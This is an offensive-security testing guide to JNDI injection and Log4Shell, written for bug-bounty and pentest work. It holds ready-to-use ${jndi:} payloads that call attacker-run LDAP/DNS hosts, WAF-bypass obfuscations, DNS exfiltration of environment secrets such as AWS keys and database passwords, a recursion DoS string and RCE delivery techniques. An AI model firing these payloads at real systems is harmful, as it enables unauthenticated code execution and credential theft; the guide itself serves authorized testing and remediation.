# JNDI Injection & Log4Shell — Advanced Testing Guide

**Author:** x8bitranjit
**Class:** JNDI Injection (Log4Shell / `${jndi:…}` lookup injection · generic `Context.lookup()` sinks · LDAP/RMI/DNS referral → remote-class / serialized-gadget / local-factory RCE)
**Impact ceiling:** **unauthenticated remote code execution** (the class's default) · **blind RCE via OOB** · **secret/env-var exfiltration over DNS** (even where RCE egress is blocked) · **SSRF** · **DoS**.
**Primary CWE:** CWE-917 (Expression Language Injection — the `${…}` lookup) · CWE-74 (Injection) · CWE-502 (Deserialization — the gadget path) · CWE-400 (DoS variant).

> ⚠️ **Advanced, Java-only class.** Get grounding from **Alvaro Muñoz & Oleksandr Mirosh — "A Journey From JNDI/LDAP Manipulation to Remote Code Execution Dream Land" (Black Hat USA 2016)** (the seminal JNDI paper), **LunaSec / Cloudflare Log4Shell writeups**, **Veracode — Michael Stepankin "Exploiting JNDI Injections in Java"** (the local-factory bypass), and **HackTricks — JNDI/Log4Shell**. This kit **OWNS the "distinguished from Log4Shell/JNDI" note** that the [../LDAP/](../LDAP/), [../Deserialization/](../Deserialization/) and [../CommandInjection/](../CommandInjection/) kits point at — read §15 for how they differ.

---

## Read this first — why one string became the decade's worst bug

> *In plain words — the anchor for this whole class:* JNDI is Java's **"look this name up and bring me back the thing it points to"** service — like calling directory assistance, giving a name, and being connected to whatever number they have on file. The bug: **you** get to supply the name, so you say "look up `ldap://my-server/evil`." Java dutifully phones *your* server, your server hands back a booby-trapped object, and Java **builds and runs it** — code execution. Log4Shell made it apocalyptic because Log4j would perform that lookup on **anything it wrote to a log file** (`${jndi:…}` inside a User-Agent, a username, a header) — so the attacker never even has to reach the lookup directly; they just get their string *logged.* And you don't need a shell to win: a single **DNS ping back to your listener** proves Java made the call = confirmed.

JNDI (Java Naming and Directory Interface) resolves a **name** into a **Java object** via a backend — LDAP, RMI, DNS, IIOP. If an attacker controls the lookup name, they point the victim JVM at **their own** LDAP/RMI server, which returns a **malicious object**; the JVM fetches/instantiates/deserializes it and **runs attacker code**. That is JNDI injection, and it has existed since 2016.

**Log4Shell (CVE-2021-44228)** made it catastrophic: Log4j's message **lookup** feature evaluated `${jndi:ldap://attacker/x}` inside *anything it logged* — a `User-Agent`, a username, a header. So **any logged, attacker-influenced string** on a vulnerable Java app became **unauthenticated RCE**, with zero authentication and (thanks to logging) an enormous, unexpected attack surface.

**Why it pays Critical — and how it beats a normal RCE for reach:**
- **Unauthenticated, pre-auth RCE.** The payload just has to be *logged* — a failed-login username, a `404`'d path, a rejected header. You don't need a valid session.
- **Blind is enough.** A single **DNS callback** to your OOB host proves the string was evaluated by a vulnerable logger — you confirm without ever landing on the response.
- **Even "patched-for-RCE" isn't safe.** Log4j 2.15 stopped remote-codebase RCE but still did lookups → **`${env:AWS_SECRET_ACCESS_KEY}` exfiltrated over DNS** = credential theft with no code execution.
- **Egress-restricted? DNS still leaks.** `dns://` / LDAP over odd ports often survive when HTTP egress is filtered.

**Report the RCE (or the confirmed OOB), not the reflected string.** "`${jndi:...}` appears in the response" is nothing. "My OOB host received a **DNS/LDAP callback from the server** carrying my unique token, proving the `User-Agent` header is logged by a vulnerable Log4j" is the finding — and on a JVM that still trusts codebases or has a gadget on the classpath, that same primitive is **RCE**.

**The one mental model.** Find any input that reaches a **JNDI lookup** — directly (`ctx.lookup(attacker)`) or indirectly (a **Log4j/logback message lookup**, an EL/SpEL sink, a config value). Make the JVM resolve **your** URL. A callback = the sink is live. Then the JVM's **patch/version state** decides *which* of three RCE techniques delivers the shell.

---

## Master Testing Sequence — the testing order

> **This is the spine.** Work top-to-bottom. Stand up an **OOB host (interactsh/Collaborator)** first — this class is confirmed **out-of-band**.

```
PHASE 0  OOB + RECON     → stand up interactsh/Collaborator; fingerprint Java (stack traces, headers, tech) (§1–§3)
PHASE 1  DETECT ★ (blind)→ spray ${jndi:ldap://TOKEN.oob/} into EVERY input with a PER-INPUT token; watch DNS/LDAP (§4–§5)
PHASE 2  BYPASS          → if WAF/filter blocks it, use nested-lookup obfuscation; switch protocol (dns/rmi) (§6–§7)
PHASE 3  IMPACT  ⭐       → pick the RCE technique by JVM state (§8–§9):
                           remote-codebase (old JVM) · serialized-gadget (marshalsec+ysoserial) · BeanFactory/EL (patched) →
                           tools (§10) · secret exfil via ${env}/${sys} (§11) · SSRF/DoS (§12)
PHASE 4  PRODUCT/RELATE  → Log4Shell CVE chain (§13) · other products H2/Logback/Solr/Spring (§14) · what it's NOT (§15)
PHASE 5  VALIDATE→REPORT → FP filter (§16) · CVSS+CWE-917 (§17) · playbooks (§18) ·
                           SAFE-PoC: OOB canary → one benign id/DNS, NO shells (§19) · dedup+report (§20)
```

**Phase-by-phase deliverable:**
1. **PHASE 0 — OOB + recon.** Stand up interactsh; confirm the target is **Java** (error pages, `JSESSIONID`, `Server`, `.jsp`/`.do`, Spring Boot whitelabel). *Deliverable:* an OOB host + "this is Java."
2. **PHASE 1 — Detect ⭐.** Inject `${jndi:ldap://<unique-token>.oob/x}` into **every** header, param, and body field, each with a **distinct token**, and watch for a callback. *Deliverable:* which exact input triggered a DNS/LDAP hit (= vulnerable + blind-confirmed).
3. **PHASE 2 — Bypass.** If blocked, obfuscate with nested lookups and try `dns://`/`rmi://`. *Deliverable:* a payload that still lands the callback.
4. **PHASE 3 — Impact ⭐.** Match the RCE technique to the JVM's patch state; or exfil secrets via `${env:…}` over DNS if RCE is mitigated. *Deliverable:* a benign `id`/`hostname` (or a confirmed secret in the DNS query).
5. **PHASE 5 — Report.** FP filter, CVSS/CWE, safe PoC (OOB + one benign proof, **no shells**), dedup, write it (§16–§20).

Reference anytime: payloads → `JNDI_ARSENAL.md`; checklist → `JNDI_CHECKLIST.md`; scripts → `poc/`; playbooks **§18**.

---

# PART I — UNDERSTAND & FIND

# 1. What JNDI injection is (the lookup → object → RCE mechanic)

```
Vulnerable pattern (generic):     ctx.lookup( <attacker-controlled string> )      // InitialContext / DirContext
Vulnerable pattern (Log4Shell):   log.info("... " + userInput);  // Log4j evaluates ${jndi:...} INSIDE the message
```
**The chain, step by step:**
```
1) Attacker supplies a JNDI URL:            ${jndi:ldap://attacker.com:1389/Exploit}
2) Victim JVM performs the lookup:          InitialContext.lookup("ldap://attacker.com:1389/Exploit")
3) Attacker LDAP server returns an entry that is ONE of:
     (a) a JNDI Reference with javaCodeBase + javaFactory  → JVM downloads the class from attacker HTTP → instantiates → RCE
     (b) a javaSerializedData blob                          → JVM DESERIALIZES it → classpath gadget (CommonsCollections…) → RCE
     (c) a Reference to a LOCAL factory (BeanFactory) + EL  → JVM builds a bean using only classpath classes → RCE (patched-JVM bypass)
4) Attacker code runs in the victim JVM.
```
The genius of Log4Shell is step 1: the attacker never calls `lookup()` — they just get a **vulnerable logger** to log their string, and Log4j's `${jndi:…}` **message lookup** performs the lookup for them.

---

# 2. The vulnerable surface (what's actually exploitable)

**Log4j (the mass-exploited instance):**
```
log4j-core 2.0-beta9  ..  2.14.1   → VULNERABLE to ${jndi:} message-lookup RCE (CVE-2021-44228).
log4j-core 2.15.0                  → RCE limited (localhost-only lookups) but STILL does lookups → data exfil + CVE-2021-45046 RCE bypass.
log4j-core 2.16.0                  → message lookups removed; DoS via recursion remained (CVE-2021-45105).
log4j-core 2.17.0                  → recursion DoS fixed. 2.17.1 → JDBCAppender RCE fixed (CVE-2021-44832, needs config control).
log4j 1.x                          → EOL; JMSAppender (CVE-2021-4104) + SocketServer deserialization (CVE-2019-17571) — different, needs config/listener.
```
**Other products with a JNDI sink (each is its own finding):**
```
Logback           CVE-2021-42550 — JNDI in a crafted logback config (needs config write).
H2 database       CVE-2021-42392 / CVE-2022-23221 — JDBC URL / console → JNDI → RCE (great in dev/admin consoles).
Apache Solr       JNDI via the config/DataImportHandler; Log4j too.
Apache Druid, Apache Struts, Apache OFBiz, Apache James, Unifi/UniFi Network, VMware Horizon/vCenter, Ubiquiti, MobileIron, many appliances.
Spring            Spring Cloud Function SpEL (CVE-2022-22963) can reach RCE; JNDI via a controllable datasource/JNDI name.
Generic Java      any app doing InitialContext.lookup(userInput) — JMS, RMI registries, LDAP auth "provider url", custom naming.
```
> **If this → then that:** you confirm the stack is **Java** and any logged input reaches a **Log4j ≤ 2.14.1** → assume **unauth RCE**; a **2.15** → assume **secret exfil + possible RCE bypass**; a non-Log4j Java app with a `lookup()`/JDBC/JNDI-name sink → **generic JNDI injection** (same RCE model). Fingerprint the exact product+version to pick the CVE and technique.

---

# 3. Where to inject (the surface is huge because it's whatever gets logged)

> *In plain words:* the attack surface isn't "inputs the app processes" — it's "inputs the app **writes down.**" A failed-login username, a 404'd URL path, a weird header a proxy logs verbatim — all get scribbled into a log, and if a vulnerable Log4j writes that line, your payload fires. That's why the bug so often hides in a header nobody thinks about (`X-Api-Version`, some custom `X-*`): spray a uniquely-tagged canary into *everything* and let the callback tell you which one was logged.

Anything the app **logs** or passes to a **lookup** is a candidate. Spray a per-input token into **all** of these:
```
HEADERS (the classic — logged verbatim by countless apps/WAFs/proxies):
  User-Agent · Referer · X-Forwarded-For · X-Api-Version · X-Forwarded-Host · X-Real-IP · True-Client-IP ·
  Authorization · Cookie · Origin · X-Requested-With · Accept-Language · Forwarded · Contact · any custom header · the Host.
PARAMS / BODY:
  every query param · every form field · JSON values (and KEYS) · usernames/emails on login (logged on failure) ·
  search terms · file names on upload · SOAP/XML fields · GraphQL variables · webhook payloads.
INDIRECT / SECOND-ORDER:
  values stored then logged later by a worker · admin panels that render/log user data · error messages that log the input ·
  chat/support tickets · HTTP methods/paths that 404 (the path gets logged).
```
> **If this → then that:** a **login username** field → apps log failed logins → inject there even unauthenticated; a **404 path** → the request line is logged → put the payload in the path/`User-Agent`; a **file upload name** → often logged by the processor. Cast wide: the vuln is usually in a header you wouldn't expect (X-Api-Version, a custom `X-*`).

---

# PART II — DETECTION (out-of-band, blind-first)

# 4. The canary probe (DNS-first, OOB-confirmed)

> *In plain words:* you send a payload whose only job is to make the server **phone home** to a listener you own — and because Java looks up the DNS name *before* it even opens the connection, a plain DNS ping already proves your string was evaluated by a live sink. That DNS hit, carrying your unique token, **is the finding** — a blind proof of unauthenticated RCE, even though you never ran a command or saw a response. Reflection of `${jndi:…}` on the page proves nothing; the callback proves everything.


```
Baseline payload:   ${jndi:ldap://<TOKEN>.<your-oob-host>/a}
DNS-only (best for egress-restricted / stealth):  ${jndi:dns://<TOKEN>.<your-oob-host>/a}
RMI alternative:    ${jndi:rmi://<TOKEN>.<your-oob-host>:1099/a}
```
- Put a **unique `<TOKEN>`** per injection point (see §5) so a callback tells you *exactly* which input is vulnerable.
- Watch **interactsh/Collaborator** for a **DNS** lookup (Log4j resolves the host before it even connects) and/or an **LDAP/RMI TCP** hit.
- **A DNS callback carrying your token = CONFIRMED** (the string was evaluated by a vulnerable JNDI/Log4j sink). That is the blind-RCE proof for a bug-bounty report even if you never run a command.
> **If this → then that:** you get a **DNS hit but no LDAP connect** → egress to LDAP is filtered but the sink is live → still **Critical** (report the confirmed lookup; try `dns://` exfil §11). **DNS + LDAP connect** → full RCE path is open → proceed to §8.

---

# 5. Per-input tokenization (know which field is the bug)

Encode the injection point into the OOB subdomain so the callback is self-labelling:
```
${jndi:ldap://ua-<rand>.oob/}      in User-Agent
${jndi:ldap://xff-<rand>.oob/}     in X-Forwarded-For
${jndi:ldap://user-<rand>.oob/}    in the username field
# the callback hostname tells you the vulnerable input + a nonce to correlate. poc/jndi_probe.py does this automatically.
```
This is how `log4j-scan` and `poc/jndi_probe.py` work: one request per input, each with a distinct token, then correlate callbacks. Low-FP: a callback is ground truth, not a guess.

---

# 6. WAF / filter bypass — nested lookup obfuscation

> *In plain words:* a WAF that blocks the literal text `${jndi:` is matching a *word* — so you never spell the word. Log4j resolves inner `${…}` pieces first, so `${lower:j}` becomes `j`, `${::-n}` becomes `n`, and the engine reassembles `jndi` at runtime *after* the WAF already waved it through. The block is a spelling filter, not a wall; you just spell the same word out of Lego bricks the filter doesn't recognise.

Log4j evaluates **nested** `${…}` lookups, so you can rebuild the word `jndi` (and the protocol) from sub-lookups that no signature matches:
```
${${lower:j}ndi:...}
${${lower:jndi}:...}
${${::-j}${::-n}${::-d}${::-i}:...}                 # ${::-X} => literal X (default-value trick)
${${env:BARFOO:-j}ndi:...}                          # env default -> j
${jndi:${lower:l}${lower:d}a${lower:p}://...}       # rebuild 'ldap'
${${upper:j}${upper:n}${upper:d}${upper:i}:...}
${j${k8s:k5:-ND}i${sd:k5:-:}...}                    # mixed
${${date:'j'}ndi:...}
# URL-encode / case-vary the whole thing; put it across two headers if the app concatenates them.
```
> **If this → then that:** the raw `${jndi:` is blocked (WAF/regex) but the sink is Log4j → the block is a **filter, not a wall**; nested `${lower:}`/`${::-}` lookups reconstruct the token at runtime and sail past. If even those are stripped, try a **different logged input** (WAFs rarely inspect every header) or `dns://`.

---

# 7. Protocol matrix (pick per egress + JVM)

```
ldap://    most common RCE path (referral → object). Blocked by trustURLCodebase for REMOTE class, but serialized/local bypass still works.
ldaps://   TLS LDAP — sometimes bypasses egress filtering that only blocks 389/1389.
rmi://     alternative object delivery; historically fewer JVM restrictions than LDAP for some paths.
dns://     DETECTION + EXFIL only (no RCE), but survives egress filtering → best blind oracle + ${env} exfil channel.
iiop://    CORBA/IIOP — niche; occasionally the only unblocked path on old app servers.
```

---

# PART III — EXPLOITATION (RCE) BY JVM STATE

# 8. The three RCE delivery techniques (choose by the JVM's patch state, §9)

> *In plain words:* the callback proved Java *phoned your server*; now your server has to hand back something that runs. There are three ways, and which one works depends on how patched the JVM is. **(A)** the oldest, easiest — "here's a URL, download this class and run it" (only old JVMs still trust that). **(B)** hand back a booby-trapped *serialized object* that detonates a gadget already on the target (works even when A is blocked — this is the Deserialization kit's territory). **(C)** the modern bypass — build the exploit entirely out of classes *already installed* on the target (Tomcat's `BeanFactory` + an expression), so nothing needs to be downloaded or deserialized. Modern JDK → try C, then B; ancient appliance → A gives the fastest shell.

**(A) Remote codebase (classic, OLD JVMs only):** the LDAP referral points at a remote factory class over HTTP; the JVM downloads and runs it.
```
LDAP entry: javaClassName=Exploit; javaCodeBase=http://attacker/; javaFactory=Exploit; objectClass=javaNamingReference
→ JVM fetches http://attacker/Exploit.class → instantiates → static{} runs your code.
Works only when trustURLCodebase=true (JDK < 6u211/7u201/8u191/11.0.1). Blocked by default on modern JVMs (§9).
```
**(B) Serialized gadget (bypasses trustURLCodebase):** the LDAP entry carries a `javaSerializedData` blob; the JVM **deserializes** it; if a gadget chain is on the classpath (Commons-Collections, etc.), it runs.
```
Use marshalsec's LDAP referral server + a ysoserial gadget (CommonsCollections5/6, Spring, etc.) — see ../Deserialization/ for chains.
Works whenever a compatible gadget is on the target classpath (very common in real apps).
```
**(C) Local factory / BeanFactory + EL (patched-JVM bypass — the important one):** use only classes **already on the target classpath** (Tomcat's `org.apache.naming.factory.BeanFactory` + an EL-evaluating bean) so no remote/serialized class is needed.
```
LDAP Reference: factory=org.apache.naming.factory.BeanFactory,
  forceString=x=eval, x=Runtime.getRuntime().exec(...)  via an EL expression (javax.el / groovy.lang.GroovyShell / etc.)
→ works even with trustURLCodebase=false, on modern JDKs, IF Tomcat/Groovy/etc. is on the classpath.
Veracode/@welk1n/rogue-jndi automate this ("JNDIExploit", "rogue-jndi", "JNDI-Injection-Exploit").
```
> **If this → then that:** modern JDK (post-Oct-2018) → **skip technique A**; try **C (BeanFactory/EL)** first (Tomcat is nearly ubiquitous), then **B (serialized gadget)** if a classpath gadget exists. Old/embedded JVM (appliances!) → **A** is the quickest shell. The exploit servers below serve **all three** and auto-select.

---

# 9. The JVM mitigation & version matrix (decides technique + severity)

```
com.sun.jndi.ldap.object.trustURLCodebase   (the LDAP path — the one Log4Shell uses):
   default TRUE   → JDK ≤ 8u181 / 7u191 / 6u201 / 11.0.0     → REMOTE codebase (technique A) works → easy RCE.
   default FALSE  → JDK ≥ 8u191 / 7u201 / 6u211 / 11.0.1 (Oct 2018) → A blocked; use B (serialized) or C (BeanFactory/EL).
com.sun.jndi.rmi.object.trustURLCodebase    (the RMI path — disabled EARLIER, don't assume Oct-2018):
   default FALSE  → JDK ≥ 8u121 / 7u131 / 6u141 (Jan 2017)   → RMI remote-codebase A blocked since 2017; LDAP stayed open ~2 more years.
Log4j lookup state (§2): ≤2.14.1 full · 2.15 localhost+exfil · 2.16 no-lookups · 2.17+ safe.
Note: many real targets run OLD embedded JVMs (network appliances, legacy app servers) → technique A still lands.
```
> **If this → then that:** you can read the JDK build from an error/banner and it's **pre-Oct-2018** → remote-codebase RCE is trivial (A). Post-2018 → the finding is still **Critical** via B/C, but note the technique in your report so the triager doesn't wrongly close it as "mitigated by modern JDK."

---

# 10. Tooling (authorized engagements only — this kit ships DETECTION, not an exploit server)

```
DETECTION / confirmation (this kit, safe):
  poc/jndi_probe.py        — spray ${jndi:} (+ obfuscated) into headers/params with per-input tokens; watch your OOB.
  poc/payload_gen.py       — generate the full payload matrix (protocols + WAF-bypass + ${env} exfil) for your OOB host.
  poc/callback_listener.py — benign multi-port TCP connection logger: confirms the JVM CALLED BACK, returns NO gadget.
  interactsh / Burp Collaborator — the OOB oracle (DNS + LDAP/RMI).
  log4j-scan (fullhunt), nuclei -tags log4j — automated canary sprayers (verify OOB by hand).
RCE DELIVERY (authorized pentest/lab only — NOT shipped here; use the established tools):
  marshalsec (LDAPRefServer/RMIRefServer) + ysoserial (serialized gadget, technique B)
  JNDI-Injection-Exploit (@welk1n) · JNDIExploit (feihong-cs) · rogue-jndi (veracode-research) — serve A/B/C, auto-select.
```
> This kit deliberately **does not** ship a gadget-delivering LDAP/RMI server. Detection + a benign callback is the bug-bounty proof; weaponised RCE delivery is for authorized engagements with the tools above, one benign command, then STOP (§19).

---

# 11. Secret / env-var exfiltration via lookups (data theft WITHOUT RCE — works on 2.15!)

> *In plain words:* even when the site "patched" enough to stop code execution, Log4j often still *resolves* lookups — so you hide a second lookup **inside the hostname** you make it phone. `${jndi:ldap://${env:AWS_SECRET_ACCESS_KEY}.your-oob/}` first expands the env-var to the actual secret, then uses it as the DNS name it looks up — so the secret walks straight out the door as a DNS query to your listener. No code runs; the cloud keys still land in your lap. This is why "we're on 2.15, we're fine" is wrong.

Log4j's lookups resolve `${env:…}`, `${sys:…}`, `${main:…}`, `${docker:…}`, `${k8s:…}` — nest them **inside** the JNDI host so the secret is exfiltrated in the **DNS query**:
```
${jndi:ldap://${env:AWS_SECRET_ACCESS_KEY}.<your-oob>/x}     → the secret becomes a DNS label to your OOB.
${jndi:dns://${sys:user.name}.${env:HOSTNAME}.<your-oob>/x}  → username + host over DNS (egress-friendly).
${jndi:ldap://${env:DB_PASSWORD}.<your-oob>/x}
# base32/hex the value if it has chars invalid in DNS; split long values across labels.
```
> **If this → then that:** RCE is mitigated (2.15/2.16, or egress-blocked) but lookups still fire → pivot to **secret exfil over DNS** — AWS keys, DB creds, tokens straight out of the environment. This is **High/Critical data disclosure on its own** and often the practical impact on "partially patched" targets.

---

# 12. Secondary impact — SSRF & DoS

```
SSRF:  the JNDI/LDAP/DNS lookup is an outbound request the attacker controls → hit internal hosts / cloud metadata
       (point ${jndi:ldap://169.254.169.254/…} or an internal service) → chain to ../SSRF/.
DoS:   CVE-2021-45105 — a self-referential lookup ${${::-${::-$${::-:}}}} causes infinite recursion → StackOverflow → crash.
       (Availability finding; authorize before proving on prod.)
```

---

# PART IV — PRODUCT-SPECIFIC & RELATED

# 13. Log4Shell deep dive — the CVE chain

```
CVE-2021-44228 (Log4Shell)  CVSS 10.0 — ${jndi:} message lookup → unauth RCE. log4j-core 2.0-beta9..2.14.1.
CVE-2021-45046  — 2.15's fix was incomplete; ${jndi:ldap://127.0.0.1#evil.com/a} + Context Map/Thread lookups → RCE/DoS. Fixed 2.16.
CVE-2021-45105  — recursive self-referential lookups → infinite recursion DoS. Fixed 2.17.0.
CVE-2021-44832  — attacker with CONFIG write can set a JDBCAppender JNDI datasource → RCE. Fixed 2.17.1.
CVE-2021-4104   — log4j 1.x JMSAppender JNDI (needs config control). CVE-2019-17571 — log4j 1.x SocketServer deserialization.
```
Detection order: fire the §4 canary → if callback, you're on ≤2.14.1 (or 2.15 for localhost/exfil). Confirm the version from callbacks (`${env}` exfil of the jar version) or error pages.

# 14. Other JNDI-vulnerable products (each its own report)

```
H2 console (CVE-2021-42392): JDBC URL jdbc:h2:mem:test;INIT=... or the console's ldap datasource → JNDI → RCE. Common in dev/CI.
Logback (CVE-2021-42550): a poisoned logback.xml with a JNDI lookup (needs config write / file upload).
Apache Solr / Druid / OFBiz / Struts: bundled vulnerable Log4j and/or direct JNDI sinks.
Spring: Spring Cloud Function SpEL (CVE-2022-22963) → RCE; a controllable JNDI datasource name → lookup RCE.
App servers (Tomcat/JBoss/WebLogic/WebSphere): JNDI is core infra — any user-controlled resource/provider URL is a sink.
```

# 15. What JNDI injection is NOT (distinguish cleanly — this kit owns the boundary)

```
vs LDAP INJECTION (../LDAP/):    LDAP injection = tampering an LDAP QUERY FILTER (auth bypass/data). JNDI injection = making
                                 the JVM CONNECT to an attacker's LDAP SERVER for a malicious object (RCE). Different bug, same protocol name.
vs INSECURE DESERIALIZATION (../Deserialization/): JNDI is often the TRIGGER; the serialized-gadget technique (B) reaches
                                 RCE via the SAME ysoserial gadgets → cross-ref that kit for chains. Deserialization can also happen without JNDI.
vs SSRF (../SSRF/):              a JNDI lookup IS an SSRF primitive, but the ceiling here is RCE, not just internal fetch.
vs SpEL/OGNL/SSTI (../SSTI/):    expression-language injection can REACH a JNDI lookup (e.g. Spring), but EL injection is its own
                                 sink class. Log4j's ${} is EL-like (CWE-917) but resolves via JNDI here.
vs Spring4Shell:                 that's SpEL/data-binding (class-loader) RCE — NOT JNDI. Don't conflate.
```

---

# PART V — VALIDITY, SEVERITY & REPORTING

# 16. False positives — STOP reporting these (auto-reject)

| # | Commonly mis-reported | Why it's NOT (yet) a finding | What makes it real |
|---|---|---|---|
| 1 | **`${jndi:...}` reflected in the response** | Reflection ≠ evaluation | An **OOB callback** (DNS/LDAP) carrying your token proves the lookup fired |
| 2 | **A scanner said "log4j" with no callback** | Tool guess / version-banner only | Your own **interactsh** got the DNS/LDAP hit from the target |
| 3 | **A DNS hit from YOUR resolver / a proxy, not the target** | Could be your tooling/CDN resolving it | The lookup comes from the **target's egress IP**, correlated to your per-input token |
| 4 | **Callback fired but from a scanner/AV sandbox** | Security products detonate payloads | Correlate timing + source ASN; re-fire with a fresh token and confirm it's the app path |
| 5 | **Version banner shows old Log4j, no reachability** | Not all inputs are logged | An actual input that reaches the sink + a callback |
| 6 | **`${env:X}` exfil claimed but the label is empty** | The env var isn't set | A **non-empty** secret label arrives at your OOB |
| 7 | **DoS payload "crashes" your own test only** | Local artifact | Reproducible recursion crash on the target (authorize) |

> **Golden rule:** a JNDI finding is an **out-of-band callback from the target's own infrastructure** carrying your **unique token** (blind-RCE proof), ideally escalated to a benign command or a leaked secret. A reflected `${jndi:}` or a scanner banner is a **lead**, not the bug.

---

# 17. Severity calibration (CVSS + CWE)

| Scenario | Typical | CWE | Notes |
|---|---|---|---|
| **Unauth RCE (callback → shell via A/B/C)** | **Critical (10.0)** | CWE-917 → CWE-502/74 | The Log4Shell default; unauth, network, full compromise |
| **Blind RCE confirmed via OOB (no shell dropped)** | **Critical** | CWE-917 | A target-sourced DNS/LDAP callback is sufficient proof |
| **Secret/env exfil over DNS (2.15 / egress-limited)** | **High → Critical** | CWE-917 → CWE-200 | AWS/DB creds in the DNS query = real data theft |
| **Authenticated / config-dependent RCE (H2, JDBCAppender, Logback)** | **High → Critical** | CWE-917/502 | Depends on the precondition (console access / config write) |
| **SSRF via JNDI lookup only** | **Medium → High** | CWE-918 | Internal reach / metadata (→ ../SSRF/) |
| **DoS (recursive lookup, CVE-2021-45105)** | **Medium → High** | CWE-400 | Availability; authorize |
| **Reflected `${jndi:}` / scanner banner, no callback** | **Informational** | — | Lead only |

**CVSS anchor (Log4Shell):** `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` = **10.0**. **CWE-917** (EL injection) is the canonical anchor; note **CWE-502** for the deserialization gadget path.

---

# 18. Impact-escalation playbooks — "you found X, now do Y"

### 18.1 You found: *a DNS callback from the target carrying your token*
- **Escalate:** you've confirmed a live JNDI/Log4j sink (blind RCE). Identify the JVM/Log4j version (§9/§13); stand up the appropriate exploit server (A/B/C, §8) on an **authorized** engagement for a benign `id`; on bug bounty, the callback + one benign command (or `${env}` exfil) is enough.
- **Severity:** **Critical**.

### 18.2 You found: *a callback only over `dns://`, none over `ldap://`*
- **Escalate:** LDAP egress is filtered — pivot to **`${env:…}` secret exfil over DNS** (§11); report the confirmed sink + leaked secrets.
- **Severity:** High/Critical (data theft).

### 18.3 You found: *the raw `${jndi:}` is WAF-blocked*
- **Escalate:** nested-lookup obfuscation (§6) + a different logged input; try `dns://`.
- **Severity:** unlocks the finding.

### 18.4 You found: *a modern JDK (post-2018, trustURLCodebase=false)*
- **Escalate:** BeanFactory/EL local bypass (technique C) or a classpath serialized gadget (B) — RCE still stands.
- **Severity:** Critical (note the technique so it isn't wrongly closed as "mitigated").

### 18.5 You found: *an H2 console / a JDBC URL field / a logback config upload*
- **Escalate:** product-specific JNDI (§14) — H2 `INIT`/console, JDBCAppender, poisoned logback.
- **Severity:** High/Critical by precondition.

---

# 19. SAFE-PoC discipline

```
DO:
  □ Use YOUR OWN OOB host (interactsh/Collaborator). A target-sourced DNS/LDAP callback carrying your unique token IS the proof.
  □ Per-input tokens so you know exactly which field is vulnerable (and can prove it cleanly).
  □ If you escalate to RCE (authorized): ONE benign command (id / hostname / a unique echo), or a single ${env} exfil. Then STOP.
  □ Prefer dns:// for the confirmation where egress is tight — least intrusive, still conclusive.
DON'T:
  □ Drop a reverse shell / persistence / beacon on a bug-bounty target. One benign callback or `id` is the finding.
  □ Exfiltrate real secrets beyond the minimum needed to prove it (one env var, redacted in the report).
  □ Fire the DoS (recursive) payload at production without explicit authorization.
  □ Leave a live exploit LDAP/RMI server running; tear it down.
```
> The single rule: **a benign OOB callback is already Critical — confirm it, optionally prove one benign command or one leaked secret, and stop.** You never need a shell to prove Log4Shell.

**Remediation to include:** upgrade Log4j to **2.17.1+** (or the JDK-appropriate fixed line); remove `JndiLookup.class` if you can't upgrade; set `log4j2.formatMsgNoLookups=true` / `LOG4J_FORMAT_MSG_NO_LOOKUPS=true` (mitigates ≥2.10, not a full fix); set `com.sun.jndi.ldap/rmi.object.trustURLCodebase=false` (default on modern JVMs); egress-filter outbound LDAP/RMI/DNS from app servers; for generic JNDI, never pass user input to `Context.lookup()` — allow-list the name; patch product-specific CVEs (H2/Logback/Spring).

---

# 20. Reporting, CWE/CVSS & de-duplication

Use `JNDI_REPORT_TEMPLATE.md`. Minimum:
```
1. Title       "Log4Shell / JNDI injection in <input> on <endpoint> → unauthenticated RCE (OOB-confirmed)"
2. Severity    CVSS 3.1 vector + score (10.0 for unauth RCE) + CWE-917 (+ CWE-502)
3. Asset       exact input (header/param/field) + endpoint + product/version if known
4. Summary     that a logged/looked-up input reaches a JNDI sink; your OOB callback proof; the RCE technique available
5. Steps       numbered: the payload, the exact input, your OOB host, the received DNS/LDAP callback (token-correlated)
6. PoC         the callback log (target IP + your token) ; optionally one benign command output or a leaked ${env} label (redacted)
7. Impact      unauthenticated RCE / secret disclosure / SSRF — the blast radius
8. Remediation upgrade/mitigate as §19
```
**De-dup:** one **sink** (one vulnerable logger/lookup) = one report even if reachable via many headers/params — list the inputs, lead with the confirmed one. A **secret-exfil-only** (2.15) finding and a **full-RCE** finding on the same sink are the *same* root cause → one report, highest impact leads.

---

# 21. Automation & red-team notes

**Automation (find candidates fast, confirm OOB by hand):**
```
poc/jndi_probe.py -u <url> --oob <id.oast.fun>        # per-input token spray (headers+params+body)
poc/payload_gen.py --oob <id.oast.fun>                # full payload matrix (protocols + WAF-bypass + ${env})
poc/callback_listener.py -p 1389,1099,8180            # benign connection logger (no gadget)
log4j-scan -u <url> ; nuclei -tags log4j,jndi -l live.txt
```
- **Quality gate:** never submit "scanner flagged log4j" or a reflected `${jndi:}`. Submit a **target-sourced OOB callback** correlated to your token (blind-RCE proof), ideally + one benign command or a leaked secret.

**Red-team angles:**
```
□ Spray the canary across every header on the whole scope — Log4Shell hides in appliances, WAFs, mail gateways, VPNs.
□ dns:// exfil of ${env}/${sys} on "patched" 2.15 hosts → cloud keys without ever running code (quiet).
□ Old embedded JVMs (network gear) → technique A remote-codebase → fast shell.
□ Chain JNDI SSRF → cloud metadata (../SSRF/) when direct RCE egress is blocked.
□ Second-order: inject into a value that a BACK-OFFICE worker logs later (higher-priv context).
□ H2/JDBC/console fields in dev/staging → JNDI RCE where prod is patched.
```

---

# Appendix A — Workflow cheat sheet

```
┌──────────────────────────────────────────────────────────────────────────┐
│                     JNDI INJECTION / LOG4SHELL                             │
├──────────────────────────────────────────────────────────────────────────┤
│ 0. OOB up (interactsh) + confirm Java stack ......................... §1-3 │
│ 1. DETECT ★: ${jndi:ldap://TOKEN.oob/} into EVERY header/param/field,      │
│    one TOKEN per input; watch DNS/LDAP callbacks .................... §4-5 │
│ 2. BYPASS: nested ${lower:}/${::-} obfuscation; dns:// / rmi:// ..... §6-7 │
│ 3. IMPACT ⭐ (pick by JVM state §9):                                        │
│    A remote-codebase (old JDK) · B serialized gadget (marshalsec+ysoserial)│
│    · C BeanFactory/EL (patched-JDK bypass) ......................... §8,10  │
│    secret exfil ${env:AWS_...} over DNS (works on 2.15) ............ §11    │
│    SSRF / DoS ...................................................... §12    │
│ 4. PRODUCT: Log4j CVE chain §13 · H2/Logback/Solr/Spring §14 · NOT §15      │
